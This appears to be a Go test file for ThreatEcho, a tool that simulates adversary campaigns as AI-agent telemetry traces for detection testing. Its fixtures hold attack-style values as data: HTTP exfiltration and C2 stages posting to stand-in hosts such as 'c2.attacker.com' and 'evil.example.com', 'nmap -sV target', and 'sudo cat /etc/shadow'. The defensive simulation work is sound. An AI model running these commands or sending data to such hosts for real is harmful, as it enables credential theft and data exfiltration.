// Copyright (c) 2024-2026 ThreatEcho. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-only
// https://threatecho.com

package engine

import (
	"strings"
	"testing"
	"time"

	"github.com/ThreatEcho/threatecho/internal/campaign"
)

// ---------------------------------------------------------------------------
// Test helpers — campaign builders
// ---------------------------------------------------------------------------

// singleStageCampaign returns a campaign with one shell stage and telemetry.
func singleStageCampaign() *campaign.Campaign {
	return &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta: campaign.Meta{
			Name:      "single-stage",
			Adversary: "TestActor",
			Severity:  "medium",
		},
		Stages: []campaign.Stage{
			{
				ID:        "recon",
				Name:      "Recon Stage",
				Technique: "T1016",
				Tactic:    "discovery",
				Execute: campaign.Execute{
					Type:     "shell",
					Commands: []string{"echo scanning", "echo probing"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"process_create", "network_connection"},
				},
			},
		},
	}
}

// multiStageCampaign returns a campaign with three stages of varying types.
func multiStageCampaign() *campaign.Campaign {
	return &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta: campaign.Meta{
			Name:      "multi-stage",
			Adversary: "AdvancedActor",
			Severity:  "high",
		},
		Stages: []campaign.Stage{
			{
				ID:        "recon",
				Name:      "Reconnaissance",
				Technique: "T1016",
				Tactic:    "discovery",
				Execute: campaign.Execute{
					Type:     "shell",
					Commands: []string{"nmap -sV target"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"process_create"},
				},
			},
			{
				ID:        "access",
				Name:      "Initial Access",
				Technique: "T1190",
				Tactic:    "initial-access",
				DependsOn: []string{"recon"},
				Execute: campaign.Execute{
					Type:   "http",
					Target: "https://target.example.com/exploit",
					Args:   map[string]string{"method": "POST"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"api_call", "network_connection"},
				},
			},
			{
				ID:        "exfil",
				Name:      "Exfiltration",
				Technique: "T1041",
				Tactic:    "exfiltration",
				DependsOn: []string{"access"},
				Execute: campaign.Execute{
					Type:   "http",
					Target: "https://c2.attacker.com/collect",
					Args:   map[string]string{"method": "POST", "content_type": "application/json"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"api_call", "network_connection", "guardrail_trigger"},
				},
			},
		},
	}
}

// emptyCampaign returns a campaign with no stages.
func emptyCampaign() *campaign.Campaign {
	return &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta: campaign.Meta{
			Name:      "empty",
			Adversary: "None",
			Severity:  "low",
		},
		Stages: []campaign.Stage{},
	}
}

// agentMessageCampaign returns a campaign with telemetry that produces
// inter_agent_message and prompt_log events.
func agentMessageCampaign() *campaign.Campaign {
	return &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta: campaign.Meta{
			Name:      "agent-comms",
			Adversary: "AgentActor",
			Severity:  "high",
		},
		Stages: []campaign.Stage{
			{
				ID:        "msg",
				Name:      "Agent Message Stage",
				Technique: "AML.T0049",
				Tactic:    "initial-access",
				Execute: campaign.Execute{
					Type:     "shell",
					Commands: []string{"echo agent message"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"inter_agent_message", "prompt_log"},
				},
			},
		},
	}
}

// fixedTimestamp returns a deterministic ISO 8601 timestamp for testing.
func fixedTimestamp() string {
	return "2026-01-15T10:00:00Z"
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

func TestRunScenario_NilCampaign(t *testing.T) {
	_, err := RunScenario(nil, DefaultRunConfig())
	if err == nil {
		t.Fatal("expected error for nil campaign, got nil")
	}
	if !strings.Contains(err.Error(), "nil") {
		t.Errorf("error should mention nil, got: %v", err)
	}
}

func TestRunScenario_EmptyCampaign(t *testing.T) {
	c := emptyCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.CampaignName != "empty" {
		t.Errorf("campaign name = %q, want %q", result.CampaignName, "empty")
	}
	if result.StageCount != 0 {
		t.Errorf("stage count = %d, want 0", result.StageCount)
	}
	if result.EventCount != 0 {
		t.Errorf("event count = %d, want 0", result.EventCount)
	}
	if len(result.Traces) != 0 {
		t.Errorf("traces = %d, want 0", len(result.Traces))
	}
}

func TestRunScenario_SingleStage(t *testing.T) {
	c := singleStageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.StageCount != 1 {
		t.Errorf("stage count = %d, want 1", result.StageCount)
	}
	if len(result.Traces) != 1 {
		t.Fatalf("traces = %d, want 1", len(result.Traces))
	}
	// 2 commands + 2 telemetry = 4 events.
	if result.EventCount != 4 {
		t.Errorf("event count = %d, want 4", result.EventCount)
	}
}

func TestRunScenario_MultipleStages(t *testing.T) {
	c := multiStageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.StageCount != 3 {
		t.Errorf("stage count = %d, want 3", result.StageCount)
	}
	if len(result.Traces) != 3 {
		t.Fatalf("traces = %d, want 3", len(result.Traces))
	}
	// Stage 1: 1 cmd + 1 tel = 2
	// Stage 2: 0 cmd + 1 exec-event + 2 tel = 3
	// Stage 3: 0 cmd + 1 exec-event + 3 tel = 4
	// Total = 9
	if result.EventCount != 9 {
		t.Errorf("event count = %d, want 9", result.EventCount)
	}
}

func TestRunScenario_DefaultConfig(t *testing.T) {
	c := singleStageCampaign()
	// Pass nil config — should use defaults.
	result, err := RunScenario(c, nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tr := result.Traces[0]
	if tr.AgentName != "simulated-agent" {
		t.Errorf("agent name = %q, want %q", tr.AgentName, "simulated-agent")
	}
	if tr.AgentType != "llm" {
		t.Errorf("agent type = %q, want %q", tr.AgentType, "llm")
	}
}

func TestRunScenario_CustomConfig(t *testing.T) {
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:     "custom-agent",
		AgentType:     "orchestrator",
		TimestampBase: fixedTimestamp(),
		EventGap:      500 * time.Millisecond,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tr := result.Traces[0]
	if tr.AgentName != "custom-agent" {
		t.Errorf("agent name = %q, want %q", tr.AgentName, "custom-agent")
	}
	if tr.AgentType != "orchestrator" {
		t.Errorf("agent type = %q, want %q", tr.AgentType, "orchestrator")
	}
	// Verify the start time matches the configured base.
	if tr.StartTime != fixedTimestamp() {
		t.Errorf("start time = %q, want %q", tr.StartTime, fixedTimestamp())
	}
}

func TestRunScenario_EventCount(t *testing.T) {
	c := multiStageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Verify total equals sum of per-stage counts.
	total := 0
	for _, sr := range result.StageResults {
		total += sr.EventCount
	}
	if total != result.EventCount {
		t.Errorf("sum of stage events (%d) != total event count (%d)", total, result.EventCount)
	}
	// Also verify against actual trace events.
	traceTotal := 0
	for _, tr := range result.Traces {
		traceTotal += len(tr.Events)
	}
	if traceTotal != result.EventCount {
		t.Errorf("sum of trace events (%d) != total event count (%d)", traceTotal, result.EventCount)
	}
}

func TestRunScenario_TraceHasCorrectFields(t *testing.T) {
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:     "test-agent",
		AgentType:     "retrieval",
		TimestampBase: fixedTimestamp(),
		EventGap:      time.Second,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tr := result.Traces[0]

	if tr.ID == "" {
		t.Error("trace ID should not be empty")
	}
	if tr.AgentName != "test-agent" {
		t.Errorf("agent name = %q, want %q", tr.AgentName, "test-agent")
	}
	if tr.AgentType != "retrieval" {
		t.Errorf("agent type = %q, want %q", tr.AgentType, "retrieval")
	}
	if tr.StartTime == "" {
		t.Error("start time should not be empty")
	}
	if tr.EndTime == "" {
		t.Error("end time should not be empty")
	}
	if len(tr.Events) == 0 {
		t.Error("trace should have events")
	}
}

func TestRunScenario_EventTimestamps(t *testing.T) {
	c := multiStageCampaign()
	cfg := &RunConfig{
		AgentName:     "ts-agent",
		AgentType:     "llm",
		TimestampBase: fixedTimestamp(),
		EventGap:      time.Second,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Collect all event timestamps across all traces (in order).
	var allTimestamps []time.Time
	for _, tr := range result.Traces {
		for _, ev := range tr.Events {
			ts, err := time.Parse(time.RFC3339, ev.Timestamp)
			if err != nil {
				t.Fatalf("invalid timestamp %q: %v", ev.Timestamp, err)
			}
			allTimestamps = append(allTimestamps, ts)
		}
	}

	// Verify monotonically non-decreasing timestamps.
	for i := 1; i < len(allTimestamps); i++ {
		if allTimestamps[i].Before(allTimestamps[i-1]) {
			t.Errorf("timestamp[%d] (%s) is before timestamp[%d] (%s)",
				i, allTimestamps[i], i-1, allTimestamps[i-1])
		}
	}

	// Verify the gap between consecutive events is exactly EventGap.
	for i := 1; i < len(allTimestamps); i++ {
		diff := allTimestamps[i].Sub(allTimestamps[i-1])
		if diff != time.Second {
			t.Errorf("gap between event %d and %d = %v, want %v", i-1, i, diff, time.Second)
		}
	}
}

func TestRunScenario_EventTypes(t *testing.T) {
	c := agentMessageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tr := result.Traces[0]
	// Expected events: 1 command (tool_call) + 2 telemetry (agent_message, prompt) = 3.
	if len(tr.Events) != 3 {
		t.Fatalf("events = %d, want 3", len(tr.Events))
	}

	types := make(map[string]int)
	for _, ev := range tr.Events {
		types[ev.Type]++
	}

	if types["tool_call"] != 1 {
		t.Errorf("tool_call events = %d, want 1", types["tool_call"])
	}
	if types["agent_message"] != 1 {
		t.Errorf("agent_message events = %d, want 1", types["agent_message"])
	}
	if types["prompt"] != 1 {
		t.Errorf("prompt events = %d, want 1", types["prompt"])
	}
}

func TestRunScenarioFromDir_ValidCampaign(t *testing.T) {
	// Use the testdata campaign from the campaign package.
	result, err := RunScenarioFromDir("../campaign/testdata/valid-campaign", DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.CampaignName != "test-campaign" {
		t.Errorf("campaign name = %q, want %q", result.CampaignName, "test-campaign")
	}
	if result.StageCount != 2 {
		t.Errorf("stage count = %d, want 2", result.StageCount)
	}
	if len(result.Traces) != 2 {
		t.Errorf("traces = %d, want 2", len(result.Traces))
	}
}

func TestRunScenarioFromDir_InvalidPath(t *testing.T) {
	_, err := RunScenarioFromDir("/nonexistent/path/to/campaign", DefaultRunConfig())
	if err == nil {
		t.Fatal("expected error for invalid path, got nil")
	}
}

func TestDefaultRunConfig(t *testing.T) {
	cfg := DefaultRunConfig()
	if cfg.AgentName != "simulated-agent" {
		t.Errorf("agent name = %q, want %q", cfg.AgentName, "simulated-agent")
	}
	if cfg.AgentType != "llm" {
		t.Errorf("agent type = %q, want %q", cfg.AgentType, "llm")
	}
	if cfg.EventGap != time.Second {
		t.Errorf("event gap = %v, want %v", cfg.EventGap, time.Second)
	}
	if cfg.IncludeMetadata {
		t.Error("include metadata should default to false")
	}
	if cfg.TimestampBase != "" {
		t.Errorf("timestamp base should default to empty, got %q", cfg.TimestampBase)
	}
}

func TestFormatRunResult_Nil(t *testing.T) {
	out := FormatScenarioResult(nil)
	if out != "No scenario result.\n" {
		t.Errorf("nil result output = %q, want %q", out, "No scenario result.\n")
	}
}

func TestFormatRunResult_Output(t *testing.T) {
	c := multiStageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	out := FormatScenarioResult(result)

	// Verify key content appears in the formatted output.
	checks := []string{
		"multi-stage",
		"Scenario Run Result",
		"Reconnaissance",
		"Initial Access",
		"Exfiltration",
	}
	for _, want := range checks {
		if !strings.Contains(out, want) {
			t.Errorf("formatted output missing %q", want)
		}
	}
	// Should contain box-drawing characters.
	if !strings.Contains(out, "┌") || !strings.Contains(out, "└") {
		t.Error("formatted output should contain box-drawing characters")
	}
}

func TestFormatRunResult_EmptyTraces(t *testing.T) {
	result := &ScenarioResult{
		CampaignName: "empty-run",
		StageCount:   0,
		EventCount:   0,
	}
	out := FormatScenarioResult(result)
	if !strings.Contains(out, "empty-run") {
		t.Error("formatted output should contain campaign name")
	}
	if !strings.Contains(out, "(no stages)") {
		t.Error("formatted output should indicate no stages")
	}
}

func TestRunScenario_Metadata(t *testing.T) {
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:       "meta-agent",
		AgentType:       "llm",
		TimestampBase:   fixedTimestamp(),
		EventGap:        time.Second,
		IncludeMetadata: true,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tr := result.Traces[0]

	// Trace-level metadata.
	if tr.Metadata == nil {
		t.Fatal("trace metadata should not be nil when IncludeMetadata is true")
	}
	if tr.Metadata["campaign"] != "single-stage" {
		t.Errorf("metadata campaign = %q, want %q", tr.Metadata["campaign"], "single-stage")
	}
	if tr.Metadata["stage_id"] != "recon" {
		t.Errorf("metadata stage_id = %q, want %q", tr.Metadata["stage_id"], "recon")
	}
	if tr.Metadata["technique"] != "T1016" {
		t.Errorf("metadata technique = %q, want %q", tr.Metadata["technique"], "T1016")
	}
	if tr.Metadata["tactic"] != "discovery" {
		t.Errorf("metadata tactic = %q, want %q", tr.Metadata["tactic"], "discovery")
	}

	// Event-level labels.
	for i, ev := range tr.Events {
		if ev.Labels == nil {
			t.Errorf("event[%d] labels should not be nil when IncludeMetadata is true", i)
			continue
		}
		if ev.Labels["stage_id"] != "recon" {
			t.Errorf("event[%d] label stage_id = %q, want %q", i, ev.Labels["stage_id"], "recon")
		}
	}
}

func TestRunScenario_NoMetadata(t *testing.T) {
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:       "no-meta-agent",
		AgentType:       "llm",
		TimestampBase:   fixedTimestamp(),
		EventGap:        time.Second,
		IncludeMetadata: false,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tr := result.Traces[0]

	// Trace-level metadata should be absent.
	if tr.Metadata != nil {
		t.Errorf("trace metadata should be nil when IncludeMetadata is false, got %v", tr.Metadata)
	}

	// Event-level labels should be absent.
	for i, ev := range tr.Events {
		if ev.Labels != nil {
			t.Errorf("event[%d] labels should be nil when IncludeMetadata is false, got %v", i, ev.Labels)
		}
	}
}

func TestRunScenario_ToolCallEvents(t *testing.T) {
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:     "tool-agent",
		AgentType:     "tool",
		TimestampBase: fixedTimestamp(),
		EventGap:      time.Second,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tr := result.Traces[0]
	// First two events are from commands → tool_call.
	for i := 0; i < 2; i++ {
		ev := tr.Events[i]
		if ev.Type != "tool_call" {
			t.Errorf("event[%d] type = %q, want %q", i, ev.Type, "tool_call")
		}
		if ev.ToolCall == nil {
			t.Fatalf("event[%d] tool_call should not be nil", i)
		}
		if ev.ToolCall.Tool != "shell_exec" {
			t.Errorf("event[%d] tool = %q, want %q", i, ev.ToolCall.Tool, "shell_exec")
		}
		if ev.ToolCall.Action != "execute" {
			t.Errorf("event[%d] action = %q, want %q", i, ev.ToolCall.Action, "execute")
		}
		if !ev.ToolCall.Success {
			t.Errorf("event[%d] success should be true", i)
		}
		if ev.ToolCall.Arguments["command"] == "" {
			t.Errorf("event[%d] should have a command argument", i)
		}
	}

	// Event 0 should have "echo scanning" as the command.
	if tr.Events[0].ToolCall.Arguments["command"] != "echo scanning" {
		t.Errorf("event[0] command = %q, want %q",
			tr.Events[0].ToolCall.Arguments["command"], "echo scanning")
	}
	// Event 1 should have "echo probing".
	if tr.Events[1].ToolCall.Arguments["command"] != "echo probing" {
		t.Errorf("event[1] command = %q, want %q",
			tr.Events[1].ToolCall.Arguments["command"], "echo probing")
	}
}

func TestRunScenario_TracePerStage(t *testing.T) {
	c := multiStageCampaign()
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// One trace per stage.
	if len(result.Traces) != len(c.Stages) {
		t.Fatalf("traces = %d, want %d (one per stage)", len(result.Traces), len(c.Stages))
	}

	// Each trace should have a unique ID.
	ids := make(map[string]bool)
	for _, tr := range result.Traces {
		if ids[tr.ID] {
			t.Errorf("duplicate trace ID: %s", tr.ID)
		}
		ids[tr.ID] = true
	}

	// Each trace ID should embed the stage ID.
	for i, tr := range result.Traces {
		stageID := c.Stages[i].ID
		if !strings.Contains(tr.ID, stageID) {
			t.Errorf("trace[%d] ID %q should contain stage ID %q", i, tr.ID, stageID)
		}
	}
}

func TestRunScenario_HTTPStageNoCommands(t *testing.T) {
	// An HTTP stage with no commands should still produce a tool_call event
	// from the execute configuration.
	c := &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta:       campaign.Meta{Name: "http-test", Adversary: "Test", Severity: "high"},
		Stages: []campaign.Stage{
			{
				ID:        "http-req",
				Name:      "HTTP Request",
				Technique: "T1071",
				Tactic:    "command-and-control",
				Execute: campaign.Execute{
					Type:    "http",
					Target:  "https://evil.example.com/c2",
					Args:    map[string]string{"method": "POST"},
					Payload: "exfil-data",
				},
				Expect: campaign.Expect{
					Telemetry: []string{"api_call"},
				},
			},
		},
	}
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tr := result.Traces[0]
	// 1 exec-event (no commands) + 1 telemetry = 2.
	if len(tr.Events) != 2 {
		t.Fatalf("events = %d, want 2", len(tr.Events))
	}

	ev := tr.Events[0]
	if ev.ToolCall == nil {
		t.Fatal("first event should be a tool_call")
	}
	if ev.ToolCall.Tool != "http_request" {
		t.Errorf("tool = %q, want %q", ev.ToolCall.Tool, "http_request")
	}
	if ev.ToolCall.Action != "send" {
		t.Errorf("action = %q, want %q", ev.ToolCall.Action, "send")
	}
	if ev.ToolCall.Target != "https://evil.example.com/c2" {
		t.Errorf("target = %q, want %q", ev.ToolCall.Target, "https://evil.example.com/c2")
	}
	if ev.ToolCall.Arguments["method"] != "POST" {
		t.Errorf("args[method] = %q, want %q", ev.ToolCall.Arguments["method"], "POST")
	}
	if ev.ToolCall.Arguments["payload"] != "exfil-data" {
		t.Errorf("args[payload] = %q, want %q", ev.ToolCall.Arguments["payload"], "exfil-data")
	}
}

func TestRunScenario_ElevatedFlag(t *testing.T) {
	c := &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta:       campaign.Meta{Name: "elevated-test", Adversary: "Test", Severity: "high"},
		Stages: []campaign.Stage{
			{
				ID:        "priv",
				Name:      "Privilege Escalation",
				Technique: "T1068",
				Tactic:    "privilege-escalation",
				Execute: campaign.Execute{
					Type:     "shell",
					Commands: []string{"sudo cat /etc/shadow"},
					Elevated: true,
				},
			},
		},
	}
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	ev := result.Traces[0].Events[0]
	if !ev.ToolCall.Elevated {
		t.Error("tool_call event should have Elevated=true for elevated stage")
	}
}

func TestRunScenario_GuardrailTelemetry(t *testing.T) {
	c := &campaign.Campaign{
		APIVersion: "v1",
		Kind:       "Campaign",
		Meta:       campaign.Meta{Name: "guardrail-test", Adversary: "Test", Severity: "high"},
		Stages: []campaign.Stage{
			{
				ID:        "gr-stage",
				Name:      "Guardrail Test",
				Technique: "LLM02",
				Tactic:    "initial-access",
				Execute: campaign.Execute{
					Type:     "shell",
					Commands: []string{"echo test"},
				},
				Expect: campaign.Expect{
					Telemetry: []string{"guardrail_trigger"},
				},
			},
		},
	}
	result, err := RunScenario(c, DefaultRunConfig())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Event 0 is the command, event 1 is the guardrail telemetry.
	if len(result.Traces[0].Events) < 2 {
		t.Fatalf("expected at least 2 events, got %d", len(result.Traces[0].Events))
	}
	ev := result.Traces[0].Events[1]
	if ev.Type != "guardrail" {
		t.Errorf("event type = %q, want %q", ev.Type, "guardrail")
	}
	if ev.Guardrail == nil {
		t.Fatal("guardrail event data should not be nil")
	}
	if !ev.Guardrail.Triggered {
		t.Error("guardrail should be triggered")
	}
	if ev.Guardrail.Category != "policy" {
		t.Errorf("guardrail category = %q, want %q", ev.Guardrail.Category, "policy")
	}
}

func TestRunScenario_ZeroEventGap(t *testing.T) {
	// A zero or negative event gap should fall back to 1s.
	c := singleStageCampaign()
	cfg := &RunConfig{
		AgentName:     "gap-agent",
		AgentType:     "llm",
		TimestampBase: fixedTimestamp(),
		EventGap:      0,
	}
	result, err := RunScenario(c, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Events should still have sequential timestamps with 1s gap.
	tr := result.Traces[0]
	if len(tr.Events) < 2 {
		t.Fatalf("need at least 2 events, got %d", len(tr.Events))
	}
	t0, _ := time.Parse(time.RFC3339, tr.Events[0].Timestamp)
	t1, _ := time.Parse(time.RFC3339, tr.Events[1].Timestamp)
	if t1.Sub(t0) != time.Second {
		t.Errorf("gap = %v, want %v (zero gap should default to 1s)", t1.Sub(t0), time.Second)
	}
}
